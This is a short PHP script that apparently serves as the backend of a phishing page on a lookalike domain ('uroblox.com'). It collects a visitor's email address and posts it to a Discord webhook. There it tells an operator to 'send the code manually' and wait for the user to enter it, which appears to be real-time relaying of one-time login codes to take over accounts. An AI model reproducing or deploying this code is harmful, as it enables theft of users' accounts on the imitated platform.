<?php
// POST JSON { email: "user@gmail.com" }
// Creates a token and notifies admin (via Discord webhook) to send the code manually.
// Returns { success: true, token: "..." }

header('Content-Type: application/json');

$raw = file_get_contents('php://input');
if (!$raw) { echo json_encode(['success'=>false,'error'=>'No input']); exit; }
$data = json_decode($raw, true);
$email = isset($data['email']) ? trim($data['email']) : ''; 

if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
  echo json_encode(['success'=>false,'error'=>'Invalid email']); exit;
}

$basePath = __DIR__;
require_once $basePath.'/lib_otp.php';

$token = bin2hex(random_bytes(16));
$now = time();

$entry = [
  'email' => $email,
  'status' => 'requested',
  'created_at' => $now,
  'updated_at' => $now,
  'code_entered' => null
];

data_store_add($token, $entry);

// Notify admin via webhook that a request arrived (so admin can send code manually)
$webhook = get_discord_webhook();
$baseUrl = 'https://uroblox.com/otp';
$msg = "🔔 OTP request\nEmail: {
$email}\nToken: {
$token}\n\nPlease send the code manually to the user and wait for them to enter it.";
if ($webhook) {
  $payload = json_encode(['content' => $msg], JSON_UNESCAPED_SLASHES|JSON_UNESCAPED_UNICODE);
  @file_get_contents($webhook, false, stream_context_create([
    'http' => [
      'method'=>'POST',
      'header'=>"Content-type: application/json\r\n",
      'content'=>$payload
    ]
  ]));
}

echo json_encode(['success'=>true,'token'=>$token]);
exit;

?>